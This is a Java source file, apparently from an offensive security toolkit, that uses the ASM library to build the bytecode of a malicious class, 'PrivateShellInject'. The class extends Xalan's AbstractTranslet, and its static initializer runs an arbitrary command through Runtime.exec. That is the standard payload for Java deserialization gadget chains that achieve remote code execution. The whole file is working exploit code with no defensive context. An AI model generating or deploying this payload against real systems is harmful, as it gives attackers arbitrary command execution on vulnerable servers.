package org.sec.payload;

import org.objectweb.asm.*;

import static org.objectweb.asm.Opcodes.*;

@SuppressWarnings("all")
public class Generator {
    public static byte[] getBytesCode(String cmd) {
        ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        MethodVisitor methodVisitor;
        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, "sample/PrivateShellInject",
                null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet",
                null);
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "()V",
                null, null);
        methodVisitor.visitCode();
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKESPECIAL,
                "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet",
                "<init>", "()V", false);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(1, 1);
        methodVisitor.visitEnd();

        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "transform",
                "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/" +
                        "internal/serializer/SerializationHandler;)V", null,
                new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        methodVisitor.visitCode();
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(0, 3);
        methodVisitor.visitEnd();

        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "transform",
                "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/" +
                        "internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/" +
                        "internal/serializer/SerializationHandler;)V",
                null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        methodVisitor.visitCode();
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(0, 4);
        methodVisitor.visitEnd();

        methodVisitor = classWriter.visitMethod(ACC_STATIC, "<clinit>",
                "()V", null, null);
        methodVisitor.visitCode();
        Label label0 = new Label();
        Label label1 = new Label();
        Label label2 = new Label();
        methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/io/IOException");
        methodVisitor.visitLabel(label0);
        methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime",
                "getRuntime", "()Ljava/lang/Runtime;", false);
        methodVisitor.visitLdcInsn(cmd);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime",
                "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
        methodVisitor.visitInsn(POP);
        methodVisitor.visitLabel(label1);
        Label label3 = new Label();
        methodVisitor.visitJumpInsn(GOTO, label3);
        methodVisitor.visitLabel(label2);
        methodVisitor.visitVarInsn(ASTORE, 0);
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL,
                "java/io/IOException", "printStackTrace", "()V", false);
        methodVisitor.visitLabel(label3);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(2, 1);
        methodVisitor.visitEnd();
        classWriter.visitEnd();
        return classWriter.toByteArray();
    }
}
